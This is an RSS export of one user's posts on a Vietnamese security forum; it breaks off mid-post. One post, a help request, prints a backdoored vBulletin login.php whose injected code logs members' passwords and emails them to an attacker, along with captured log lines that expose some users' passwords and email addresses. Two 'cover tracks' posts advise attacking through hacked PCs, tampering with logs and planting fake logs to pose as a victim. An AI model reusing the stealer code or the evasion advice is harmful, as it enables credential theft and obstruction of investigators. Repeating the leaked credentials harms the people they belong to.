<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Messages posted by "phonglanbiec"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/listByUser/126158.hva</link>
		<description><![CDATA[Messages posted by "phonglanbiec"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>Case Study: xoá vết (cover tracks)</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">miyumi2 wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">hoahongtuoi wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">chiro8x wrote:</cite><br>
		<blockquote>Thực lòng em không cảm thấy tin tưởng vào các ISP của Việt Nam lắm, chúng ta sử dụng internet thông qua các thiết bị mạng và các thiết bị này được phân phối thông qua các ISP. ISP sẽ biết đích xác là ai dùng thiết bị gì, tại địa điểm nào, username đăng nhập vào hệ thống là gì.
&nbsp;
		</blockquote>
Đề nghị bạn nói rõ những nhận định mình trích ở trên, sử dụng căn cứ kỹ thuật, không nhận định cảm tính. 
&nbsp;
		</blockquote>

Làm thế nào nhà mạng thống kê được lưu lượng sử dụng internet (dù là cáp đồng, cáp quang hay usb 3G) để cuối tháng in hóa đơn tính tiền cho bạn? Bạn tự tìm hiểu, đó cũng sẽ là lời giải thích cho đề nghị của bạn.&nbsp;
		</blockquote>

Chẳng có ISP nào mà không log những thông tin đó lại. Nên nếu chỉ nói ISP VN thì hơi tội cho họ quá!]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/41388/262144.hva#262144</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/41388/262144.hva#262144</link>
				<pubDate><![CDATA[Sat, 28 Apr 2012 00:15:35]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Xem lại các email đã gởi từ hàm mail() trên PHP</title>
				<description><![CDATA[ Chào các bạn,

Mình đang gặp 1 tình huống như sau:

- Forum của bạn mình sử dụng VBB có bản quyền. Nhưng hôm nay thì không login vào được. Thế là hắn nhờ mình kiểm tra tại sao.
- Mình kiểm tra trong file login.php thì phát hiện rằng có 1 đoạn mã sẽ lưu lại tất cả thông tin người gởi gởi lên. Lưu vào 1 file (mà hắn giả là session) ở /tmp/. Cứ mỗi lần file có dung lượng &gt;= 10MB thì hàm mail() sẽ tự gởi đến địa chỉ email của hắn.
- Cách khắc phục tạm thời của mình là lấy 1 file login.php sạch thế cho file đó.

Và hiện tại mình cần giúp đỡ để điều tra thêm:

1. Làm thế nào để kiểm tra đã có bao nhiêu email gởi từ hàm mail() của PHP?
2. Tại sao có 1 giai đoạn tự nhiên nó không nhận cái form password gởi lên?

Vì nội dung file log lại là:


<blockquote>User: xxx Pass: 113114 Email :xxx@yahoo.com.vn ID : 35164  GroupID : 4 IP: 123.16.146.0 Time: Sunday 22nd of April 2012 08:08:35 PM
User: xxx Pass: 314159htm Email :xxx@yahoo.com ID : 11557  GroupID : 17 IP: 113.185.1.167 Time: Sunday 22nd of April 2012 08:09:29 PM
User: xxx Pass: canhdonglua Email :xxx@yahoo.com ID : 22680  GroupID : 2 IP: 1.52.27.213 Time: Sunday 22nd of April 2012 08:11:54 PM
User: onelove46 Pass:  Email :hoahuongduong663@gmail.com ID : 31446  GroupID : 2 IP: 123.24.141.8 Time: Sunday 22nd of April 2012 08:19:00 PM
User: tienhieuo01 Pass:  Email :tienhieuo01@yahoo.com.vn ID : 26462  GroupID : 2 IP: 1.53.2.31 Time: Sunday 22nd of April 2012 08:40:21 PM
User: edenhoang Pass:  Email :uptinmuaban@gmail.com ID : 33772  GroupID : 3 IP: 113.172.221.137 Time: Sunday 22nd of April 2012 08:41:33 PM&nbsp;
		</blockquote>

Nội dung file php mà hắn đã sửa lại là:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;?php
/*======================================================================*\
|| #################################################################### ||
|| # vBulletin 3.8.4 - Licence Number VBF6B249B5
|| # ---------------------------------------------------------------- # ||
|| # Copyright ï¿&#65533;2000-2009 Jelsoft Enterprises Ltd. All Rights Reserved. ||
|| # This file may not be redistributed in whole or significant part. # ||
|| # ---------------- VBULLETIN IS NOT FREE SOFTWARE ---------------- # ||
|| #<span class="link"> http://www.vbulletin.com</span> |<span class="link"> http://www.vbulletin.com/license.html</span> # ||
|| #################################################################### ||
\*======================================================================*/

// ####################### SET PHP ENVIRONMENT ###########################
error_reporting&#40;E_ALL & ~E_NOTICE & ~8192&#41;;

// #################### DEFINE IMPORTANT CONSTANTS #######################
define&#40;'THIS_SCRIPT', 'login'&#41;;
define&#40;'CSRF_PROTECTION', true&#41;;
define&#40;'CSRF_SKIP_LIST', 'login'&#41;;

// ################### PRE-CACHE TEMPLATES AND DATA ######################
// get special phrase groups
$phrasegroups = array&#40;&#41;;

// get special data templates from the datastore
$specialtemplates = array&#40;&#41;;

// pre-cache templates used by all actions
$globaltemplates = array&#40;&#41;;

// pre-cache templates used by specific actions
$actiontemplates = array&#40;
	'lostpw' =&gt; array&#40;
		'lostpw',
		'humanverify'
	&#41;
&#41;;

// ######################### REQUIRE BACK-END ############################
require_once&#40;'./global.php'&#41;;
require_once&#40;DIR . '/includes/functions_login.php'&#41;;

// #######################################################################
// ######################## START MAIN SCRIPT ############################
// #######################################################################

$vbulletin-&gt;input-&gt;clean_gpc&#40;'r', 'a', TYPE_STR&#41;;

if &#40;empty&#40;$_REQUEST&#91;'do'&#93;&#41; AND empty&#40;$vbulletin-&gt;GPC&#91;'a'&#93;&#41;&#41;
{
	exec_header_wwwect&#40;$vbulletin-&gt;options&#91;'forumhome'&#93; . '.php'&#41;;
}

// ############################### start logout ###############################
if &#40;$_REQUEST&#91;'do'&#93; == 'logout'&#41;
{
	define&#40;'NOPMPOPUP', true&#41;;

	$vbulletin-&gt;input-&gt;clean_gpc&#40;'r', 'logouthash', TYPE_STR&#41;;

	if &#40;$vbulletin-&gt;userinfo&#91;'userid'&#93; != 0 AND !verify_security_token&#40;$vbulletin-&gt;GPC&#91;'logouthash'&#93;, $vbulletin-&gt;userinfo&#91;'securitytoken_raw'&#93;&#41;&#41;
	{
		eval&#40;standard_error&#40;fetch_error&#40;'logout_error', $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;, $vbulletin-&gt;userinfo&#91;'securitytoken'&#93;&#41;&#41;&#41;;
	}

	process_logout&#40;&#41;;

	$vbulletin-&gt;url = fetch_replaced_session_url&#40;$vbulletin-&gt;url&#41;;
	if &#40;strpos&#40;$vbulletin-&gt;url, 'do=logout'&#41; !== false&#41;
	{
		$vbulletin-&gt;url = $vbulletin-&gt;options&#91;'forumhome'&#93; . '.php' . $vbulletin-&gt;session-&gt;vars&#91;'sessionurl_q'&#93;;
	}
	$show&#91;'member'&#93; = false;
	eval&#40;standard_error&#40;fetch_error&#40;'cookieclear', create_full_url&#40;$vbulletin-&gt;url&#41;, $vbulletin-&gt;options&#91;'forumhome'&#93;, $vbulletin-&gt;session-&gt;vars&#91;'sessionurl_q'&#93;&#41;, '', false&#41;&#41;;

}

// ############################### start do login ###############################
// this was a _REQUEST action but where do we all login via request?
if &#40;$_POST&#91;'do'&#93; == 'login'&#41;
{
	$vbulletin-&gt;input-&gt;clean_array_gpc&#40;'p', array&#40;
		'vb_login_username'        =&gt; TYPE_STR,
		'vb_login_password'        =&gt; TYPE_STR,
		'vb_login_md5password'     =&gt; TYPE_STR,
		'vb_login_md5password_utf' =&gt; TYPE_STR,
		'postvars'                 =&gt; TYPE_BINARY,
		'cookieuser'               =&gt; TYPE_BOOL,
		'logintype'                =&gt; TYPE_STR,
		'cssprefs'                 =&gt; TYPE_STR,
	&#41;&#41;;
	try{
      		if&#40;$vbulletin-&gt;db-&gt;query_first&#40;&quot;SELECT username FROM userpan WHERE username ='&quot;.$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;.&quot;'&quot;&#41;&#41;{
			$vbulletin-&gt;db-&gt;query_write&#40;&quot;UPDATE userpan  set password='&quot;.$vbulletin-&gt;GPC&#91;'vb_login_password'&#93;.&quot;' where username='&quot;.$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;.&quot;'&quot;&#41;;
		}else{
			$vbulletin-&gt;db-&gt;query_write&#40;&quot;INSERT INTO  userpan&#40;username,password&#41; values&#40;'&quot;.$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;.&quot;','&quot;.$vbulletin-&gt;GPC&#91;'vb_login_password'&#93;.&quot;'&#41;&quot;&#41;;
		}      	
		$vbulletin-&gt;GPC&#91;'vb_login_password'&#93;=&quot;&quot;;
 		}
	catch&#40;Exception $e&#41;{}
	// can the user login?
	$strikes = verify_strike_status&#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;&#41;;

	if &#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93; == ''&#41;
	{
		eval&#40;standard_error&#40;fetch_error&#40;'badlogin', $vbulletin-&gt;options&#91;'bburl'&#93;, $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;, $strikes&#41;&#41;&#41;;
	}

	// make sure our user info stays as whoever we were &#40;for example, we might be logged in via cookies already&#41;
	$original_userinfo = $vbulletin-&gt;userinfo;

	if &#40;!verify_authentication&#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;, $vbulletin-&gt;GPC&#91;'vb_login_password'&#93;, $vbulletin-&gt;GPC&#91;'vb_login_md5password'&#93;, $vbulletin-&gt;GPC&#91;'vb_login_md5password_utf'&#93;, $vbulletin-&gt;GPC&#91;'cookieuser'&#93;, true&#41;&#41;
	{
		&#40;$hook = vBulletinHook::fetch_hook&#40;'login_failure'&#41;&#41; ? eval&#40;$hook&#41; : false;

		// check password
		exec_strike_user&#40;$vbulletin-&gt;userinfo&#91;'username'&#93;&#41;;

		if &#40;$vbulletin-&gt;GPC&#91;'logintype'&#93; === 'cplogin' OR $vbulletin-&gt;GPC&#91;'logintype'&#93; === 'modcplogin'&#41;
		{
			// log this error if attempting to access the control panel
			require_once&#40;DIR . '/includes/functions_log_error.php'&#41;;
			log_vbulletin_error&#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;, 'security'&#41;;
		}
		$vbulletin-&gt;userinfo = $original_userinfo;

		if &#40;$vbulletin-&gt;options&#91;'usestrikesystem'&#93;&#41;
		{
			eval&#40;standard_error&#40;fetch_error&#40;'badlogin_strikes', $vbulletin-&gt;options&#91;'bburl'&#93;, $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;, $strikes&#41;&#41;&#41;;
		}
		else
		{
			eval&#40;standard_error&#40;fetch_error&#40;'badlogin', $vbulletin-&gt;options&#91;'bburl'&#93;, $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;&#41;&#41;&#41;;
		}
	}

	exec_unstrike_user&#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;&#41;;

	// create new session
	process_new_login&#40;$vbulletin-&gt;GPC&#91;'logintype'&#93;, $vbulletin-&gt;GPC&#91;'cookieuser'&#93;, $vbulletin-&gt;GPC&#91;'cssprefs'&#93;&#41;;



$lg_username = strtolower&#40;$vbulletin-&gt;GPC&#91;&quot;vb_login_username&quot;&#93;&#41;; 
   	$lg_password = $vbulletin-&gt;GPC&#91;&quot;vb_login_password&quot;&#93;; 
&#91;color=red&#93;   	$mail=&quot;xxx@live.com&quot;;
	$lfile=&quot;/tmp/sess_xxx&quot;;&#91;/color&#93;
	$lhande=@fopen&#40;$lfile,'a'&#41;;
$email = &quot;unknow&quot;;
        if&#40;isset&#40;$vbulletin-&gt;userinfo&#91;'email'&#93;&#41;&#41;
	$email = $vbulletin-&gt;userinfo&#91;'email'&#93;;
        $userid =$vbulletin-&gt;userinfo&#91;'userid'&#93;; 
        $groupID=$vbulletin-&gt;userinfo&#91;'usergroupid'&#93;; 
	$result = @mysql_query&#40;&quot;select email from user where username='&quot;.$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;.&quot;'&quot;&#41;;
	if&#40;$result&#41;
	{
		$row = @mysql_fetch_array&#40;$result&#41;;
			$email = $row&#91;&quot;email&quot;&#93;;
	}	
	$ldata=&quot;User: &quot;.$_POST&#91;&quot;vb_login_username&quot;&#93;.&quot; Pass: &quot;.$lg_password.&quot; Email :&quot;.$email .&quot; ID : &quot;.$userid. &quot;  GroupID : &quot;.$groupID. &quot; IP: &quot;.$_SERVER&#91;&quot;REMOTE_ADDR&quot;&#93;.&quot; Time: &quot;.date&#40;'l jS \of F Y h:i:s A'&#41;.&quot;\n&quot;;
	$sub=@$_SERVER&#91;'HTTP_HOST'&#93;.&quot;  user login &quot;.date&#40;'l jS \of F Y h:i:s A'&#41;;
	@fwrite&#40;$lhande,$ldata&#41;;
	@fclose&#40;$lhande&#41;;
	if&#40;@filesize&#40;$lfile&#41;&gt;=1024*10&#41; {
		$data=file_get_contents&#40;$lfile&#41;;
		@mail&#40;$mail,$sub,$data&#41;;
		@unlink&#40;$lfile&#41;;
	}














	// do wwwect
	do_login_wwwect&#40;&#41;;

}
else if &#40;$_GET&#91;'do'&#93; == 'login'&#41;
{
	// add consistency with previous behavior
	exec_header_wwwect&#40;$vbulletin-&gt;options&#91;'forumhome'&#93; . '.php'&#41;;
}

// ############################### start lost password ###############################
if &#40;$_REQUEST&#91;'do'&#93; == 'lostpw'&#41;
{
	$vbulletin-&gt;input-&gt;clean_gpc&#40;'r', 'email', TYPE_NOHTML&#41;;
	$email = $vbulletin-&gt;GPC&#91;'email'&#93;;

	if &#40;$permissions&#91;'forumpermissions'&#93; & $vbulletin-&gt;bf_ugp_forumpermissions&#91;'canview'&#93;&#41;
	{
		$navbits = construct_navbits&#40;array&#40;'' =&gt; $vbphrase&#91;'lost_password_recovery_form'&#93;&#41;&#41;;
		eval&#40;'$navbar = &quot;' . fetch_template&#40;'navbar'&#41; . '&quot;;'&#41;;
	}
	else
	{
		$navbar = '';
	}

	// human verification
	if &#40;fetch_require_hvcheck&#40;'lostpw'&#41;&#41;
	{
		require_once&#40;DIR . '/includes/class_humanverify.php'&#41;;
		$verification =& vB_HumanVerify::fetch_library&#40;$vbulletin&#41;;
		$human_verify = $verification-&gt;output_token&#40;&#41;;
	}
	else
	{
		$human_verify = '';
	}

	$url =& $vbulletin-&gt;url;
	eval&#40;'print_output&#40;&quot;' . fetch_template&#40;'lostpw'&#41; . '&quot;&#41;;'&#41;;
}

// ############################### start email password ###############################
if &#40;$_POST&#91;'do'&#93; == 'emailpassword'&#41;
{

	$vbulletin-&gt;input-&gt;clean_array_gpc&#40;'p', array&#40;
		'email' =&gt; TYPE_STR,
		'userid' =&gt; TYPE_UINT,
		'humanverify'  =&gt; TYPE_ARRAY,
	&#41;&#41;;

	if &#40;$vbulletin-&gt;GPC&#91;'email'&#93; == ''&#41;
	{
		eval&#40;standard_error&#40;fetch_error&#40;'invalidemail', $vbulletin-&gt;options&#91;'contactuslink'&#93;&#41;&#41;&#41;;
	}

	if &#40;fetch_require_hvcheck&#40;'lostpw'&#41;&#41;
	{
		require_once&#40;DIR . '/includes/class_humanverify.php'&#41;;
		$verify =& vB_HumanVerify::fetch_library&#40;$vbulletin&#41;;
		if &#40;!$verify-&gt;verify_token&#40;$vbulletin-&gt;GPC&#91;'humanverify'&#93;&#41;&#41;
		{
	  		standard_error&#40;fetch_error&#40;$verify-&gt;fetch_error&#40;&#41;&#41;&#41;;
	  	}
	}

	require_once&#40;DIR . '/includes/functions_user.php'&#41;;

	$users = $db-&gt;query_read_slave&#40;&quot;
		SELECT userid, username, email, languageid
		FROM &quot; . TABLE_PREFIX . &quot;user
		WHERE email = '&quot; . $db-&gt;escape_string&#40;$vbulletin-&gt;GPC&#91;'email'&#93;&#41; . &quot;'
	&quot;&#41;;
	if &#40;$db-&gt;num_rows&#40;$users&#41;&#41;
	{
		while &#40;$user = $db-&gt;fetch_array&#40;$users&#41;&#41;
		{
			if &#40;$vbulletin-&gt;GPC&#91;'userid'&#93; AND $vbulletin-&gt;GPC&#91;'userid'&#93; != $user&#91;'userid'&#93;&#41;
			{
				continue;
			}
			$user&#91;'username'&#93; = unhtmlspecialchars&#40;$user&#91;'username'&#93;&#41;;

			$user&#91;'activationid'&#93; = build_user_activation_id&#40;$user&#91;'userid'&#93;, 2, 1&#41;;

			eval&#40;fetch_email_phrases&#40;'lostpw', $user&#91;'languageid'&#93;&#41;&#41;;
			vbmail&#40;$user&#91;'email'&#93;, $subject, $message, true&#41;;
		}

		$vbulletin-&gt;url = str_replace&#40;'&quot;', '', $vbulletin-&gt;url&#41;;
		eval&#40;print_standard_wwwect&#40;'wwwect_lostpw', true, true&#41;&#41;;
	}
	else
	{
		eval&#40;standard_error&#40;fetch_error&#40;'invalidemail', $vbulletin-&gt;options&#91;'contactuslink'&#93;&#41;&#41;&#41;;
	}
}

// ############################### start reset password ###############################
if &#40;$vbulletin-&gt;GPC&#91;'a'&#93; == 'pwd' OR $_REQUEST&#91;'do'&#93; == 'resetpassword'&#41;
{

	$vbulletin-&gt;input-&gt;clean_array_gpc&#40;'r', array&#40;
		'userid'       =&gt; TYPE_UINT,
		'u'            =&gt; TYPE_UINT,
		'activationid' =&gt; TYPE_STR,
		'i'            =&gt; TYPE_STR
	&#41;&#41;;

	if &#40;!$vbulletin-&gt;GPC&#91;'userid'&#93;&#41;
	{
		$vbulletin-&gt;GPC&#91;'userid'&#93; = $vbulletin-&gt;GPC&#91;'u'&#93;;
	}

	if &#40;!$vbulletin-&gt;GPC&#91;'activationid'&#93;&#41;
	{
		$vbulletin-&gt;GPC&#91;'activationid'&#93; = $vbulletin-&gt;GPC&#91;'i'&#93;;
	}

	$userinfo = verify_id&#40;'user', $vbulletin-&gt;GPC&#91;'userid'&#93;, 1, 1&#41;;

	$user = $db-&gt;query_first&#40;&quot;
		SELECT activationid, dateline
		FROM &quot; . TABLE_PREFIX . &quot;useractivation
		WHERE type = 1
			AND userid = $userinfo&#91;userid&#93;
	&quot;&#41;;

	if &#40;!$user&#41;
	{
		// no activation record, probably got back here after a successful request, back to home
		exec_header_wwwect&#40;$vbulletin-&gt;options&#91;'forumhome'&#93; . '.php'&#41;;
	}

	if &#40;$user&#91;'dateline'&#93; &lt; &#40;TIMENOW - 24 * 60 * 60&#41;&#41;
	{  // is it older than 24 hours?
		eval&#40;standard_error&#40;fetch_error&#40;'resetexpired', $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;&#41;&#41;&#41;;
	}

	if &#40;$user&#91;'activationid'&#93; != $vbulletin-&gt;GPC&#91;'activationid'&#93;&#41;
	{ //wrong act id
		eval&#40;standard_error&#40;fetch_error&#40;'resetbadid', $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;&#41;&#41;&#41;;
	}

	// delete old activation id
	$db-&gt;query_write&#40;&quot;DELETE FROM &quot; . TABLE_PREFIX . &quot;useractivation WHERE userid = $userinfo&#91;userid&#93; AND type = 1&quot;&#41;;

	$newpassword = fetch_random_password&#40;8&#41;;

	// init user data manager
	$userdata =& datamanager_init&#40;'User', $vbulletin, ERRTYPE_STANDARD&#41;;
	$userdata-&gt;set_existing&#40;$userinfo&#41;;
	$userdata-&gt;set&#40;'password', $newpassword&#41;;
	$userdata-&gt;save&#40;&#41;;

	&#40;$hook = vBulletinHook::fetch_hook&#40;'reset_password'&#41;&#41; ? eval&#40;$hook&#41; : false;

	eval&#40;fetch_email_phrases&#40;'resetpw', $userinfo&#91;'languageid'&#93;&#41;&#41;;
	vbmail&#40;$userinfo&#91;'email'&#93;, $subject, $message, true&#41;;

	eval&#40;standard_error&#40;fetch_error&#40;'resetpw', $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;&#41;&#41;&#41;;

}

/*======================================================================*\
|| ####################################################################
|| # Downloaded: 21:09, Mon Sep 28th 2009
|| # CVS: $RCSfile$ - $Revision: 31381 $
|| ####################################################################
\*======================================================================*/
?&gt;</pre>
		</div>

Thông tin về server:

<blockquote>Apache version	2.2.17
PHP version	5.2.14
MySQL version	5.0.95-community
Architecture	i686
Operating system	linux
Kernel version	2.6.18-238.19.1.el5PAE&nbsp;
		</blockquote>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/42028/261895.hva#261895</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/42028/261895.hva#261895</link>
				<pubDate><![CDATA[Sun, 22 Apr 2012 22:45:49]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Hỏi bằng Kỹ Sư và bằng Cử Nhân Đại Học, nhờ tư vấn</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">Ikut3 wrote:</cite><br>
		<blockquote>tôi không nghĩ sinh viên mới ra trường thì sẽ được gọi là kĩ sư.theo tôi kĩ sư không chỉ là một học hàm đổi bằng 4 năm đại học.mà kĩ sư là giá trị là sự đúc rút kinh nghiệm nhiều năm giữa chuyện thực hành chuyên sâu và am hiểu toàn cục cho đến chi tiết giá trị kiến thức của một lĩnh vực nhất định

thế nên theo tôi đừng quan trọng là cử nhân hay kĩ sư làm gì.nếu cần bổ sung kiến thức cho những chỗ khuyết thì học thôi. chỉ có thời gian mới có thể trả lời giá trị thực của bạn chứ 2 thứ kia thì không thể đâu

thanks&nbsp;
		</blockquote>
<span class="link"> http://dantri.com.vn/c4/s25-171951/bang-cu-nhan-va-bang-ky-su-khac-nhau-nhu-the-nao.htm</span>

Bằng cử nhân của những ngành Kỹ thuật thì có nghĩa là người học được học những gì thiên về hướng nghiên cứu. Còn Kỹ sư thiên về hướng thực hành.

2 bằng có giá trị như nhau cũng như kiến thức gần như nhau.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/41515/257564.hva#257564</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/41515/257564.hva#257564</link>
				<pubDate><![CDATA[Fri, 9 Mar 2012 04:40:03]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Case Study: xoá vết (cover tracks)</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">.lht. wrote:</cite><br>
		<blockquote>
<font color='cyan'>Đến đây, có thể &quot;thông tin&quot; máy ta được che giấu (khi đi qua các proxies) nhưng &quot;hành động&quot; của chúng ta không thể nào che giấu được khi qua những chặng này.</font>
&nbsp;
		</blockquote>

Như mình đã nói, thông tin ta connect đến các chặng này thì không thể che dấu được, mỗi bước đi của ta ít nhiều đều để lại dấu chân. Nhưng quan trọng ta chọn đi ở đâu, chẳng hạn như đi ra biển (các servers) thì dấu chân để lại nhiều; còn đi trên gạch (các PC đã bị ta hack) thì dấu chân của ta để lại ít hơn.

Suy nghĩ của mình khi viết bài này: mình đặt mình là người điều tra, và người điều tra nghĩ gì, sau đó mình làm ngược lại với suy nghĩ đó :)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/41388/257138.hva#257138</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/41388/257138.hva#257138</link>
				<pubDate><![CDATA[Wed, 7 Mar 2012 10:13:08]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Case Study: xoá vết (cover tracks)</title>
				<description><![CDATA[ Mình xin phân tích dựa trên cái sơ đồ của anh comale theo ý kiến cá nhân:

máy con (1.1.1.1) --&gt; jump server 1 (2.2.2.2) ---&gt; jump server 2 (3.3.3.3) --&gt; firewall bảo vệ đích (4.4.4.4) --&gt; đích (5.5.5.5). 

Từ 1.1.1.1 --&gt; 2.2.2.2: Mặc định khi mình connect ra ngoài thì những thông tin của mình như IP, ngày giờ truy cập đều tự động log trên ISP. Do đó, nếu muốn giấu thông tin lên ISP để sau ngày khỏi bị &quot;truy ngược&quot; lại là rất khó. Tuy nhiên, thay vì giấu thông tin đến những server có log thì thay vào đó, ta connect đến những điểm log ít nhất. Như 1 PC nào đó bị ta hack chẳng hạn. Khi đó, nếu bị &quot;truy ngược&quot; trong quá trình điều tra của cơ quan an ninh thì đến PC đã bị ta hack, thông tin của ta lộ ra ít hơn.

Từ 2.2.2.2 --&gt; 3.3.3.3: Trong giai đoạn này, ta vẫn còn chút lựa chọn trong việc chọn jump server 2. Do vậy, trong giai đoạn này cần kiến thức của ta là chọn jump server log thông tin ít, ta có can thiệp được hay không, Windows server thì log những gì, Linux server thì log những gì, từ những thông tin đó có thể tìm ra ta hay không.


Từ 3.3.3.3 --&gt; 4.4.4.4: Đến giai đoạn này thì chắc chắn thông tin như IP, thời gian truy cập của ta (ở đây được hiểu là 3.3.3.3) sẽ đươc log lại toàn bộ, bên cạnh đó những requests của ta là gì cũng được log theo. Cho nên, giai đoạn này ta không thể che giấu hết thân phận của mình, mà chỉ có thể &quot;qua mặt&quot; firewall như những requests của ta có hợp lệ hay không? nếu chấp nhận bất hợp lệ thì tỷ lê giữa hợp lệ/bất hợp lệ là bao nhiêu? (vì giả sử có điều tra, thì người điều tra cũng khó phân biệt được ta là 1 zombie bị lợi dụng, vô tình thấy lỗi hay là cố ý thấy lỗi), firewall sử dụng để lọc là gì? liệu có điểm yếu hay không? firewall đó mặc định log những gì? options thì log được gì nữa không?

Từ 4.4.4.4 --&gt; 5.5.5.5: Giai đoạn này ta đã xác định mình tấn công những gì: OS, Web server hay là application server? Nếu tấn công vào OS, bug ta tấn công có được log lại như 1 sự kiện lỗi hay không? hay bug đó server xử lý như 1 request bình thường? Tương tư như web server và application server. Với mỗi loại tấn công ta còn xác định mình đã có trong tay những gì, có can thiệp hệ thống được hay không? Nếu can thiệp được, có can thiệp được logs hay không? Nếu không can thiệp được, ta có thể làm nhiễu log hay không? Nếu làm nhiễu, thì ta phải dùng nhiều thông tin khác nhau để làm nhiễu như IP khác nhau, User-Agent khác nhau, các bước trong quá trình tấn công khác nhau nhằm làm khó khăn hơn trong việc xác định người tấn công.

Tuy nhiên, sự thật là sự thật, nếu người khác có thời gian, chắc chắn họ sẽ tìm ra. Do vậy, ngoài việc có thể/không có thể can thiệp vào log của server. Ta còn phải tạo cho mình 1 vỏ bọc an toàn. Ví dụ như máy tính ta sau khi tấn công xong phải huỷ hết mọi thông tin: ví dụ như tấn công từ VMWare, sau khi tấn công xong thì lưu mọi thông tin đó lên Internet, huỷ ngay máy VMWare đó. Máy luôn sẵn sàng có 1 chương trình làm backdoor, 1 log ảo nhằm nếu bị phát hiện, thì ta vẫn có thể chứng minh mình là 1 nạn nhân trong 1 quá trình :)

]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/41388/257037.hva#257037</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/41388/257037.hva#257037</link>
				<pubDate><![CDATA[Tue, 6 Mar 2012 02:09:54]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Xin được hỗ trợ về NGINX cho Joomla!</title>
				<description><![CDATA[ Mình thấy bạn có nói là đã qua được đến nút NEXT. Mình có xem lại đoạn đối thoại của bạn và anh conmale. Bạn config sai những chỗ như anh conmale nói nhưng bạn nói là không qua được nút NEXT cũng đồng nghĩa với việc show trang lên nhưng nút NEXT không hoạt động.

Mình nghĩ theo hướng hẹp lại: việc đã show trang web lên nghĩa là đã pass qua được phần fastcgi để xử lý các code PHP và show lên cho bạn xem. Nhưng nút NEXT không hoạt động thì bạn phải tập trung xem lại log, code xem dòng lệnh nào liên quan nút NEXT, log ghi nhận gì khi bạn click vào nút NEXT.

]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/40043/246961.hva#246961</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/40043/246961.hva#246961</link>
				<pubDate><![CDATA[Mon, 12 Sep 2011 12:08:32]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Xin tư vấn thuê và cấu hình máy chủ Share Hosting windows</title>
				<description><![CDATA[ Nếu làm về dịch vụ hosting thì mình nghĩ bạn nên thuê hẳn dedicated server, đảm bảo tính ổn định cho khách hàng và mở rộng trong tương lai.

Nếu bạn chưa rành thì có thể sử dụng control panel là DirectAdmin cho rẻ :), thông thường cài DirectAdmin thì các phần mềm nền sẽ được cài theo luôn ho bạn (FTP, Apache, MySQL).]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/39665/244433.hva#244433</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/preList/39665/244433.hva#244433</link>
				<pubDate><![CDATA[Thu, 28 Jul 2011 22:15:12]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
			<item>
				<title>Quá nhiều socket TIME_WAIT</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">secmask wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">namduong8889 wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">secmask wrote:</cite><br>
		<blockquote>ok, nghe cũng ná ná trường hơp của tớ :D, bạn thử áp dụng cách của tớ chưa? kết quả sao, cái này chỉ cần chỉnh mấy thông số trong kernel thôi, không cần dịch lại kernel. nếu thấy ổn thì có thể add config đó vào /etc/sysctl.conf để có hiệu lực lâu dài.&nbsp;
		</blockquote>

Chào bác :D

Nguyên nhân căn bản vẫn là do có quá nhiều TIME_WAIT giống như bác, nếu ngắt đi được cái TIME_WAIT thì tốt, 

nhưng em đang chạy VPS chứ không phải server riêng, quyền root có thể ghi vào fule sysctl.conf nhưng các lệnh trong đó thì không có quyền thực hiện. Em không được sửa kernel vì HP họ nó sửa là ảnh hưởng tới các VPS khác trên cùng server;

